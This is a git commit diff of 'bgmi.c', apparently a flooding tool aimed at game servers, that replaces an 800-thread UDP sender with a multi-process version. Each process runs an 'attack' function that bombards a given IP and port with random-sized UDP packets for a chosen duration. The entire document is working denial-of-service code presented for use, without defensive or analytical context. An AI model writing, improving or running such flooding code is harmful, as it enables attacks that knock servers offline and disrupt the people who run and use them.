d5b2c2f6369d3270e7bb0cafc1a5465e0deef366
Titanop242424 <optitan317@gmail.com>
2025-03-18 19:15:21 +0530

    Update bgmi.c

--- bgmi.c
+++ bgmi.c
@@ -2,92 +2,82 @@
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
 #include <arpa/inet.h>
-#include <pthread.h>
+#include <sys/wait.h>
 #include <time.h>
 
-#define NUM_THREADS 800
-#define MAX_PAYLOAD_SIZE 1024
-
 void usage() {
-    printf("Usage: ./packet_sender ip port time\n");
+    printf("Usage: ./soulfix ip port time processes\n");
     exit(1);
 }
 
-struct thread_data {
-    char *ip;
-    int port;
-    int time;
-};
-
-void generate_random_payload(unsigned char *payload, size_t size) {
-    for (size_t i = 0; i < size; i++) {
-        payload[i] = rand() % 256;
+void randomize_payload(char *payload, int size) {
+    for (int i = 0; i < size; i++) {
+        payload[i] = (rand() % 256);  // Random byte values (0-255)
     }
 }
 
-void *send_packets(void *arg) {
-    struct thread_data *data = (struct thread_data *)arg;
+void attack(char *ip, int port, int duration) {
     int sock;
     struct sockaddr_in server_addr;
-    time_t endtime;
-    
-    srand(time(NULL) ^ pthread_self());
+    time_t endtime = time(NULL) + duration;
 
     if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
         perror("Socket creation failed");
-        pthread_exit(NULL);
+        exit(1);
     }
 
     memset(&server_addr, 0, sizeof(server_addr));
     server_addr.sin_family = AF_INET;
-    server_addr.sin_port = htons(data->port);
-    server_addr.sin_addr.s_addr = inet_addr(data->ip);
+    server_addr.sin_port = htons(port);
+    server_addr.sin_addr.s_addr = inet_addr(ip);
 
-    endtime = time(NULL) + data->time;
+    srand(time(NULL) ^ getpid());  // Unique seed for randomness
 
     while (time(NULL) <= endtime) {
-        size_t payload_size = (rand() % MAX_PAYLOAD_SIZE) + 1;
-        unsigned char payload[payload_size];
-        generate_random_payload(payload, payload_size);
+        int payload_size = (rand() % 800) + 200;  // Random size (200-1000 bytes)
+        char payload[payload_size];
+        randomize_payload(payload, payload_size);
 
-        if (sendto(sock, payload, payload_size, 0, (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
-            perror("Send failed");
-            close(sock);
-            pthread_exit(NULL);
-        }
+        sendto(sock, payload, payload_size, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
+
+        usleep((rand() % 1000) + 500);  // Random delay (500-1500 microseconds)
     }
 
     close(sock);
-    pthread_exit(NULL);
+    exit(0);
 }
 
 int main(int argc, char *argv[]) {
-    if (argc != 4) {
+    if (argc != 5) {
         usage();
     }
 
     char *ip = argv[1];
     int port = atoi(argv[2]);
-    int time = atoi(argv[3]);
+    int duration = atoi(argv[3]);
+    int processes = atoi(argv[4]);
 
-    pthread_t thread_ids[NUM_THREADS];
-    struct thread_data data = {ip, port, time};
+    printf("Flood started on %s:%d for %d seconds with %d processes\n", ip, port, duration, processes);
 
-    printf("Sending packets to %s:%d for %d seconds with %d threads\n", ip, port, time, NUM_THREADS);
-
-    for (int i = 0; i < NUM_THREADS; i++) {
-        if (pthread_create(&thread_ids[i], NULL, send_packets, (void *)&data) != 0) {
-            perror("Thread creation failed");
+    for (int i = 0; i < processes; i++) {
+        pid_t pid = fork();
+        if (pid < 0) {
+            perror("Fork failed");
             exit(1);
         }
-        printf("Thread %lu created.\n", thread_ids[i]);
+        if (pid == 0) {
+            attack(ip, port, duration);
+        }
     }
 
-    for (int i = 0; i < NUM_THREADS; i++) {
-        pthread_join(thread_ids[i], NULL);
+    for (int i = 0; i < processes; i++) {
+        wait(NULL);
     }
 
-    printf("Packet sending finished.\n");
+    printf("Attack finished\n");
     return 0;
 }
